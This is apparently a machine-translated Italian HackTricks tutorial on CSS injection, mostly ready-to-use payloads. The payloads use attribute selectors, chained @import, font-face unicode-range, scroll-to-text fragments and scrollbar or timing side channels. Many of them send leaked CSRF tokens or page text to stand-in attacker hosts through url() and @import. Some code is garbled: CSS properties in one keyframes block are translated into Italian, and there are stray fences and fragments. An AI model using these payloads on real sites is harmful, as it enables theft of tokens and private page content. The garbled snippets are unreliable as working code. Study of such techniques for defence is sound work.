# Iniezione CSS

<details>

<summary><strong>Impara l'hacking su AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Iniezione CSS

### Selettore di attributi

I selettori CSS sono creati per corrispondere ai valori degli attributi `name` e `value` di un elemento `input`. Se l'attributo value dell'elemento input inizia con un carattere specifico, viene caricata una risorsa esterna predefinita:
```css
input[name=csrf][value^=a]{
background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
background-image: url(https://attacker.com/exfil/9);
}
```
Tuttavia, questo approccio presenta una limitazione quando si tratta di elementi di input nascosti (`type="hidden"`) perch√© gli elementi nascosti non caricano sfondi.

#### Bypass per Elementi Nascosti

Per aggirare questa limitazione, √® possibile mirare a un elemento fratello successivo utilizzando il combinatore di fratello generale `~`. La regola CSS si applica quindi a tutti i fratelli che seguono l'elemento di input nascosto, causando il caricamento dell'immagine di sfondo:
```css
input[name=csrf][value^=csrF] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
Un esempio pratico di sfruttare questa tecnica √® dettagliato nello snippet di codice fornito. Puoi visualizzarlo [qui](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e).

#### Prerequisiti per l'Injection di CSS

Perch√© la tecnica di Injection di CSS sia efficace, devono essere soddisfatte determinate condizioni:

1. **Lunghezza del Payload**: Il vettore di injection di CSS deve supportare payload sufficientemente lunghi per ospitare i selettori creati.
2. **Rivalutazione del CSS**: Dovresti avere la capacit√† di inquadrare la pagina, che √® necessaria per attivare la rivalutazione del CSS con i payload appena generati.
3. **Risorse Esterne**: La tecnica presuppone la possibilit√† di utilizzare immagini ospitate esternamente. Questo potrebbe essere limitato dalla Politica di Sicurezza dei Contenuti (CSP) del sito.

### Selettore di Attributo Cieco

Come [**spiegato in questo post**](https://portswigger.net/research/blind-css-exfiltration), √® possibile combinare i selettori **`:has`** e **`:not`** per identificare contenuti anche da elementi ciechi. Questo √® molto utile quando non si ha idea di cosa ci sia all'interno della pagina web che carica l'injection di CSS.\
√à anche possibile utilizzare quei selettori per estrarre informazioni da diversi blocchi dello stesso tipo come in:
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background:url(/m);
}
</style>
<input name=mytoken value=1337>
<input name=myname value=gareth>
```
Combinando questo con la seguente tecnica **@import**, √® possibile esfiltrare molte **informazioni utilizzando l'iniezione di CSS dalle pagine cieche con** [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**.**

### @import

La tecnica precedente ha alcuni svantaggi, controlla i prerequisiti. Devi essere in grado di **inviare pi√π link alla vittima**, oppure devi essere in grado di **inserire l'iframe nella pagina vulnerabile all'iniezione di CSS**.

Tuttavia, c'√® un'altra tecnica intelligente che utilizza **CSS `@import`** per migliorare la qualit√† della tecnica.

Questo √® stato mostrato per la prima volta da [**Pepe Vila**](https://vwzq.net/slides/2019-s3\_css\_injection\_attacks.pdf) e funziona in questo modo:

Invece di caricare la stessa pagina una volta e ancora con decine di payload diversi ogni volta (come nel caso precedente), **caricheremo la pagina solo una volta e solo con un import verso il server degli attaccanti** (questo √® il payload da inviare alla vittima):
```css
@import url('//attacker.com:5001/start?');
```
1. L'importazione **ricever√† uno script CSS** dagli attaccanti e il **browser lo caricher√†**.
2. La prima parte dello script CSS che l'attaccante invier√† √® **un altro `@import` al server degli attaccanti.**
3. Il server degli attaccanti non risponder√† ancora a questa richiesta, poich√© vogliamo rivelare alcuni caratteri e poi rispondere a questa importazione con il payload per rivelare quelli successivi.
4. La seconda e pi√π grande parte del payload sar√† un **payload di perdita di selettore di attributo**.
5. Questo invier√† al server degli attaccanti il **primo carattere del segreto e l'ultimo**.
6. Una volta che il server degli attaccanti ha ricevuto il **primo e l'ultimo carattere del segreto**, risponder√† all'importazione richiesta nel passaggio 2.
7. La risposta sar√† esattamente la stessa dei **passaggi 2, 3 e 4**, ma questa volta cercher√† di **trovare il secondo carattere del segreto e poi il penultimo**.

L'attaccante **seguir√† quel loop fino a quando riuscir√† a rivelare completamente il segreto**.

Puoi trovare il [**codice di Pepe Vila per sfruttare questo qui**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) oppure puoi trovare quasi lo [**stesso codice ma commentato qui**.](./#css-injection)

{% hint style="info" %}
Lo script cercher√† di scoprire 2 caratteri alla volta (dall'inizio e dalla fine) perch√© il selettore di attributi consente di fare cose come:
```css
/* value^=  to match the beggining of the value*/
input[value^="0"]{--s0:url(http://localhost:5001/leak?pre=0)}

/* value$=  to match the ending of the value*/
input[value$="f"]{--e0:url(http://localhost:5001/leak?post=f)}
```
Questo permette allo script di rivelare il segreto pi√π velocemente.
{% endhint %}

{% hint style="warning" %}
A volte lo script **non rileva correttamente che il prefisso + suffisso scoperto √® gi√† la flag completa** e continuer√† in avanti (nel prefisso) e all'indietro (nel suffisso) e a un certo punto si bloccher√†.\
Non preoccuparti, controlla semplicemente l'**output** perch√© **puoi vedere la flag l√¨**.
{% endhint %}

### Altri selettori

Altri modi per accedere alle parti del DOM con i **selettori CSS**:

* **`.classe-da-cercare:nth-child(2)`**: Questo cercher√† il secondo elemento con classe "classe-da-cercare" nel DOM.
*   Selettore **`:empty`**: Usato ad esempio in [**questo writeup**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**:**

```css
[role^="img"][aria-label="1"]:empty { background-image: url("YOUR_SERVER_URL?1"); }
```

### XS-Search basato su errori

**Riferimento:** [Attacco basato su CSS: Abuso di unicode-range di @font-face](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [PoC di XS-Search basato su errori di @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

L'intenzione generale √® **utilizzare un font personalizzato da un endpoint controllato** e garantire che **il testo (in questo caso, 'A') venga visualizzato con questo font solo se la risorsa specificata (`favicon.ico`) non pu√≤ essere caricata**.
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face{
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range:U+0041;
}

#poc0{
font-family: 'poc';
}

</style>
</head>
<body>

<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **Utilizzo del Carattere Personalizzato**:
   - Un carattere personalizzato √® definito utilizzando la regola `@font-face` all'interno di un tag `<style>` nella sezione `<head>`.
   - Il carattere √® chiamato `poc` e viene recuperato da un endpoint esterno (`http://attacker.com/?leak`).
   - La propriet√† `unicode-range` √® impostata su `U+0041`, mirando al carattere Unicode specifico 'A'.

2. **Elemento Oggetto con Testo di Riserva**:
   - Viene creato un elemento `<object>` con `id="poc0"` nella sezione `<body>`. Questo elemento cerca di caricare una risorsa da `http://192.168.0.1/favicon.ico`.
   - Il `font-family` per questo elemento √® impostato su `'poc'`, come definito nella sezione `<style>`.
   - Se la risorsa (`favicon.ico`) non riesce a caricare, il contenuto di riserva (la lettera 'A') all'interno del tag `<object>` viene visualizzato.
   - Il contenuto di riserva ('A') verr√† reso utilizzando il carattere personalizzato `poc` se la risorsa esterna non pu√≤ essere caricata.

### Stilizzazione del Frammento di Testo di Scorrimento

Il pseudo-classe **`:target`** viene utilizzato per selezionare un elemento mirato da un **frammento di URL**, come specificato nella [specifica CSS Selectors Level 4](https://drafts.csswg.org/selectors-4/#the-target-pseudo). √à fondamentale comprendere che `::target-text` non corrisponde ad alcun elemento a meno che il testo non sia esplicitamente mirato dal frammento.

Sorge una preoccupazione per la sicurezza quando gli attaccanti sfruttano la funzionalit√† del **frammento di testo di scorrimento**, consentendo loro di confermare la presenza di testo specifico su una pagina web caricando una risorsa dal loro server tramite un'iniezione HTML. Il metodo coinvolge l'inserimento di una regola CSS come questa:
```css
:target::before { content : url(target.png) }
```
In tali scenari, se il testo "Amministratore" √® presente sulla pagina, la risorsa `target.png` viene richiesta dal server, indicando la presenza del testo. Un'istanza di questo attacco pu√≤ essere eseguita attraverso un URL appositamente creato che incorpora il CSS iniettato insieme a un frammento di scorrimento al testo:
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
Qui, l'attacco manipola l'iniezione HTML per trasmettere il codice CSS, puntando sul testo specifico "Amministratore" attraverso il frammento Scroll-to-text (`#:~:text=Amministratore`). Se il testo viene trovato, la risorsa indicata viene caricata, segnalando involontariamente la sua presenza all'attaccante.

Per la mitigazione, si dovrebbero notare i seguenti punti:

1. **Corrispondenza STTF Limitata**: Il Frammento Scroll-to-text (STTF) √® progettato per corrispondere solo a parole o frasi, limitando quindi la sua capacit√† di rivelare segreti o token arbitrari.
2. **Limitazione ai Contesti di Navigazione di Alto Livello**: STTF opera esclusivamente nei contesti di navigazione di alto livello e non funziona all'interno degli iframe, rendendo qualsiasi tentativo di sfruttamento pi√π evidente per l'utente.
3. **Necessit√† di Attivazione Utente**: STTF richiede un gesto di attivazione dell'utente per funzionare, il che significa che gli sfruttamenti sono fattibili solo attraverso navigazioni avviate dall'utente. Questo requisito mitiga considerevolmente il rischio che gli attacchi vengano automatizzati senza interazione dell'utente. Tuttavia, l'autore del post sul blog evidenzia condizioni specifiche e bypass (ad esempio, ingegneria sociale, interazione con estensioni del browser diffuse) che potrebbero agevolare l'automazione dell'attacco.

La consapevolezza di questi meccanismi e delle potenziali vulnerabilit√† √® fondamentale per mantenere la sicurezza web e proteggersi da tattiche sfruttative simili.

Per ulteriori informazioni, consulta il report originale: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

Puoi controllare un [**exploit che utilizza questa tecnica per un CTF qui**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb).

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

√à possibile specificare **font esterni per valori unicode specifici** che verranno raccolti solo se quei valori unicode sono presenti nella pagina. Ad esempio:
```html
<style>
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range:U+0041;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range:U+0042;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range:U+0043;
}
#sensitive-information{
font-family:poc;
}
</style>

<p id="sensitive-information">AB</p>htm
```
### Esfiltrazione del nodo di testo (I): legature <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**Riferimento:** [Wykradanie danych w ≈õwietnym stylu ‚Äì czyli jak wykorzystaƒá CSS-y do atak√≥w na webaplikacjƒô](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

La tecnica descritta coinvolge l'estrazione di testo da un nodo sfruttando le legature dei font e monitorando i cambiamenti di larghezza. Il processo coinvolge diversi passaggi:

1. **Creazione di Font Personalizzati**:
- I font SVG sono creati con glifi che hanno un attributo `horiz-adv-x`, che imposta una larghezza elevata per un glifo che rappresenta una sequenza di due caratteri.
- Esempio di glifo SVG: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, dove "XY" indica una sequenza di due caratteri.
- Questi font vengono poi convertiti nel formato woff utilizzando fontforge.

2. **Rilevamento dei Cambiamenti di Larghezza**:
- Il CSS √® utilizzato per garantire che il testo non venga a capo (`white-space: nowrap`) e per personalizzare lo stile della barra di scorrimento.
- L'apparizione di una barra di scorrimento orizzontale, stilizzata in modo distintivo, funge da indicatore (oracolo) che una specifica legatura, e quindi una specifica sequenza di caratteri, √® presente nel testo.
- Il CSS coinvolto:
```css
body { white-space: nowrap };
body::-webkit-scrollbar { background: blue; }
body::-webkit-scrollbar:horizontal { background: url(http://attacker.com/?leak); }
```

3. **Processo di Sfruttamento**:
- **Passo 1**: Vengono creati font per coppie di caratteri con larghezza sostanziale.
- **Passo 2**: Viene utilizzato un trucco basato sulla barra di scorrimento per rilevare quando il glifo di larghezza elevata (legatura per una coppia di caratteri) viene renderizzato, indicando la presenza della sequenza di caratteri.
- **Passo 3**: Una volta rilevata una legatura, vengono generati nuovi glifi che rappresentano sequenze di tre caratteri, incorporando la coppia rilevata e aggiungendo un carattere precedente o successivo.
- **Passo 4**: Viene effettuato il rilevamento della legatura di tre caratteri.
- **Passo 5**: Il processo si ripete, rivelando progressivamente l'intero testo.

4. **Ottimizzazione**:
- Il metodo attuale di inizializzazione utilizzando `<meta refresh=...` non √® ottimale.
- Un approccio pi√π efficiente potrebbe coinvolgere il trucco `@import` del CSS, migliorando le prestazioni dello sfruttamento.

### Esfiltrazione del nodo di testo (II): leaking del set di caratteri con un font predefinito (senza necessit√† di risorse esterne) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Riferimento:** [PoC using Comic Sans by @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

Questo trucco √® stato rilasciato in questa [**discussione di Slackers**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what\_can\_we\_do\_with_single\_css\_injection/). Il set di caratteri utilizzato in un nodo di testo pu√≤ essere esfiltrato **utilizzando i font predefiniti** installati nel browser: non sono necessari font esterni o personalizzati.

Il concetto ruota attorno all'utilizzo di un'animazione per espandere incrementalmente la larghezza di un `div`, consentendo a un carattere alla volta di passare dalla parte 'suffisso' del testo alla parte 'prefisso'. Questo processo divide efficacemente il testo in due sezioni:

1. **Prefisso**: La linea iniziale.
2. **Suffisso**: Le linee successive.

Le fasi di transizione dei caratteri apparirebbero come segue:

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**


Durante questa transizione, viene utilizzato il **trucco dell'intervallo unicode** per identificare ogni nuovo carattere man mano che si unisce al prefisso. Ci√≤ viene realizzato passando al font Comic Sans, che √® notevolmente pi√π alto del font predefinito, attivando di conseguenza una barra di scorrimento verticale. L'apparizione di questa barra di scorrimento rivela indirettamente la presenza di un nuovo carattere nel prefisso.

Anche se questo metodo consente di rilevare i caratteri unici man mano che appaiono, non specifica quale carattere viene ripetuto, ma solo che si √® verificata una ripetizione.

{% hint style="info" %}
Fondamentalmente, l'**intervallo unicode viene utilizzato per rilevare un carattere**, ma poich√© non vogliamo caricare un font esterno, dobbiamo trovare un altro modo.\
Quando il **carattere** viene **trovato**, viene **assegnato** il font **Comic Sans preinstallato**, che lo **rende pi√π grande** e **attiva una barra di scorrimento** che **esfiltrer√† il carattere trovato**.
{% endhint %}

Controlla il codice estratto dal PoC:
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face{font-family:has_A;src:local('Comic Sans MS');unicode-range:U+41;font-style:monospace;}
@font-face{font-family:has_B;src:local('Comic Sans MS');unicode-range:U+42;font-style:monospace;}
@font-face{font-family:has_C;src:local('Comic Sans MS');unicode-range:U+43;font-style:monospace;}
@font-face{font-family:has_D;src:local('Comic Sans MS');unicode-range:U+44;font-style:monospace;}
@font-face{font-family:has_E;src:local('Comic Sans MS');unicode-range:U+45;font-style:monospace;}
@font-face{font-family:has_F;src:local('Comic Sans MS');unicode-range:U+46;font-style:monospace;}
@font-face{font-family:has_G;src:local('Comic Sans MS');unicode-range:U+47;font-style:monospace;}
@font-face{font-family:has_H;src:local('Comic Sans MS');unicode-range:U+48;font-style:monospace;}
@font-face{font-family:has_I;src:local('Comic Sans MS');unicode-range:U+49;font-style:monospace;}
@font-face{font-family:has_J;src:local('Comic Sans MS');unicode-range:U+4a;font-style:monospace;}
@font-face{font-family:has_K;src:local('Comic Sans MS');unicode-range:U+4b;font-style:monospace;}
@font-face{font-family:has_L;src:local('Comic Sans MS');unicode-range:U+4c;font-style:monospace;}
@font-face{font-family:has_M;src:local('Comic Sans MS');unicode-range:U+4d;font-style:monospace;}
@font-face{font-family:has_N;src:local('Comic Sans MS');unicode-range:U+4e;font-style:monospace;}
@font-face{font-family:has_O;src:local('Comic Sans MS');unicode-range:U+4f;font-style:monospace;}
@font-face{font-family:has_P;src:local('Comic Sans MS');unicode-range:U+50;font-style:monospace;}
@font-face{font-family:has_Q;src:local('Comic Sans MS');unicode-range:U+51;font-style:monospace;}
@font-face{font-family:has_R;src:local('Comic Sans MS');unicode-range:U+52;font-style:monospace;}
@font-face{font-family:has_S;src:local('Comic Sans MS');unicode-range:U+53;font-style:monospace;}
@font-face{font-family:has_T;src:local('Comic Sans MS');unicode-range:U+54;font-style:monospace;}
@font-face{font-family:has_U;src:local('Comic Sans MS');unicode-range:U+55;font-style:monospace;}
@font-face{font-family:has_V;src:local('Comic Sans MS');unicode-range:U+56;font-style:monospace;}
@font-face{font-family:has_W;src:local('Comic Sans MS');unicode-range:U+57;font-style:monospace;}
@font-face{font-family:has_X;src:local('Comic Sans MS');unicode-range:U+58;font-style:monospace;}
@font-face{font-family:has_Y;src:local('Comic Sans MS');unicode-range:U+59;font-style:monospace;}
@font-face{font-family:has_Z;src:local('Comic Sans MS');unicode-range:U+5a;font-style:monospace;}
@font-face{font-family:has_0;src:local('Comic Sans MS');unicode-range:U+30;font-style:monospace;}
@font-face{font-family:has_1;src:local('Comic Sans MS');unicode-range:U+31;font-style:monospace;}
@font-face{font-family:has_2;src:local('Comic Sans MS');unicode-range:U+32;font-style:monospace;}
@font-face{font-family:has_3;src:local('Comic Sans MS');unicode-range:U+33;font-style:monospace;}
@font-face{font-family:has_4;src:local('Comic Sans MS');unicode-range:U+34;font-style:monospace;}
@font-face{font-family:has_5;src:local('Comic Sans MS');unicode-range:U+35;font-style:monospace;}
@font-face{font-family:has_6;src:local('Comic Sans MS');unicode-range:U+36;font-style:monospace;}
@font-face{font-family:has_7;src:local('Comic Sans MS');unicode-range:U+37;font-style:monospace;}
@font-face{font-family:has_8;src:local('Comic Sans MS');unicode-range:U+38;font-style:monospace;}
@font-face{font-family:has_9;src:local('Comic Sans MS');unicode-range:U+39;font-style:monospace;}
@font-face{font-family:rest;src: local('Courier New');font-style:monospace;unicode-range:U+0-10FFFF}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line{
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% { font-family: rest; } /* delay for width change */
5% { font-family: has_A, rest; --leak: url(?a); }
6% { font-family: rest; }
10% { font-family: has_B, rest; --leak: url(?b); }
11% { font-family: rest; }
15% { font-family: has_C, rest; --leak: url(?c); }
16% { font-family: rest }
20% { font-family: has_D, rest; --leak: url(?d); }
21% { font-family: rest; }
25% { font-family: has_E, rest; --leak: url(?e); }
26% { font-family: rest; }
30% { font-family: has_F, rest; --leak: url(?f); }
31% { font-family: rest; }
35% { font-family: has_G, rest; --leak: url(?g); }
36% { font-family: rest; }
40% { font-family: has_H, rest; --leak: url(?h); }
41% { font-family: rest }
45% { font-family: has_I, rest; --leak: url(?i); }
46% { font-family: rest; }
50% { font-family: has_J, rest; --leak: url(?j); }
51% { font-family: rest; }
55% { font-family: has_K, rest; --leak: url(?k); }
56% { font-family: rest; }
60% { font-family: has_L, rest; --leak: url(?l); }
61% { font-family: rest; }
65% { font-family: has_M, rest; --leak: url(?m); }
66% { font-family: rest; }
70% { font-family: has_N, rest; --leak: url(?n); }
71% { font-family: rest; }
75% { font-family: has_O, rest; --leak: url(?o); }
76% { font-family: rest; }
80% { font-family: has_P, rest; --leak: url(?p); }
81% { font-family: rest; }
85% { font-family: has_Q, rest; --leak: url(?q); }
86% { font-family: rest; }
90% { font-family: has_R, rest; --leak: url(?r); }
91% { font-family: rest; }
95% { font-family: has_S, rest; --leak: url(?s); }
96% { font-family: rest; }
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% { width: 0px }
1% { width: 20px }
2% { width: 40px }
3% { width: 60px }
4% { width: 80px }
4% { width: 100px }
```css
5% { larghezza: 120px }
6% { larghezza: 140px }
7% { larghezza: 0px }
}

div::-webkit-scrollbar {
sfondo: blu;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
sfondo: blu var(--leak);
}
```
### Esfiltrazione del nodo di testo (III): illecita il set di caratteri con un font predefinito nascondendo elementi (senza richiedere risorse esterne) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Riferimento:** Questo √® menzionato come [una soluzione non riuscita in questo articolo](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Questo caso √® molto simile al precedente, tuttavia, in questo caso l'obiettivo di rendere specifici **caratteri pi√π grandi di altri √® nascondere qualcosa** come un pulsante per evitare che venga premuto dal bot o un'immagine che non verr√† caricata. Quindi potremmo misurare l'azione (o l'assenza di azione) e sapere se un determinato carattere √® presente all'interno del testo.

### Esfiltrazione del nodo di testo (III): illecita il set di caratteri tramite il tempo di cache (senza richiedere risorse esterne) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Riferimento:** Questo √® menzionato come [una soluzione non riuscita in questo articolo](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

In questo caso, potremmo provare a esfiltrare se un carattere √® presente nel testo caricando un falso font dalla stessa origine:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
Se c'√® una corrispondenza, il **font verr√† caricato da `/static/bootstrap.min.css?q=1`**. Anche se non verr√† caricato correttamente, il **browser dovrebbe memorizzarlo nella cache**, e anche se non c'√® cache, c'√® un meccanismo **304 not modified**, quindi la **risposta dovrebbe essere pi√π veloce** rispetto ad altre cose.

Tuttavia, se la differenza di tempo tra la risposta memorizzata nella cache e quella non memorizzata non √® abbastanza grande, ci√≤ non sar√† utile. Ad esempio, l'autore ha menzionato: Tuttavia, dopo i test, ho scoperto che il primo problema √® che la velocit√† non √® molto diversa, e il secondo problema √® che il bot utilizza il flag `disk-cache-size=1`, il che √® davvero premuroso.

### Esfiltrazione del nodo di testo (III): leaking del set di caratteri misurando il caricamento di centinaia di "font" locali (senza richiedere risorse esterne) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Riferimento:** Questo √® menzionato come [una soluzione non riuscita in questo articolo](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

In questo caso √® possibile indicare al **CSS di caricare centinaia di font falsi** dalla stessa origine quando si verifica una corrispondenza. In questo modo √® possibile **misurare il tempo** impiegato e scoprire se un carattere appare o meno con qualcosa del genere:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1),
url(/static/bootstrap.min.css?q=2),
....
url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
E il codice del bot appare cos√¨:
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
Quindi, se il font non corrisponde, ci si aspetta che il tempo di risposta durante la visita al bot sia di circa 30 secondi. Tuttavia, se c'√® un corrispondenza del font, verranno inviate molteplici richieste per recuperare il font, causando un'attivit√† di rete continua. Di conseguenza, ci vorr√† pi√π tempo per soddisfare la condizione di stop e ricevere la risposta. Pertanto, il tempo di risposta pu√≤ essere utilizzato come indicatore per determinare se c'√® una corrispondenza del font.

## Riferimenti

* [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
* [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
* [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
* [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
